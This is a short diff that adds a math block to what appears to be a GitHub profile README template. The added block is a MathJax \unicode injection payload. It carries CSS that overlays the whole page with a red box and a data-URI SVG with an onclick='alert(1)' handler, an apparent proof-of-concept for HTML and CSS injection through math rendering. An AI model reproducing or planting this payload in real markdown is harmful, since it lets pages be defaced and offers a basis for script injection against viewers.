@@ -14,3 +14,6 @@ Here are some ideas to get you started:
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 -->
+
+```math
+\ce{$\unicode[arial; --leet: 3301; z-index: 100; top: 0; left: 0; width: 100%; height: 100%; background: red; content: url('data:image/svg+xml;%20charset=utf8,%20%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20height%3D%2260%22%20width%3D%22200%22%3E%0A%0A%20%20%3CforeignObject%20y%3D%220%22%20x%3D%220%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%0A%09%3Cdiv%20onclick%3D%22alert(1)%22%20style%3D%22color%3A%20blue%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3E%0A%09%09I%20am%20%3Cpre%20%3EHTML%3C%2Fpre%3E%0A%09%3C%2Fdiv%3E%0A%20%20%3C%2FforeignObject%3E%0A%3C%2Fsvg%3E');]{x0000}$}
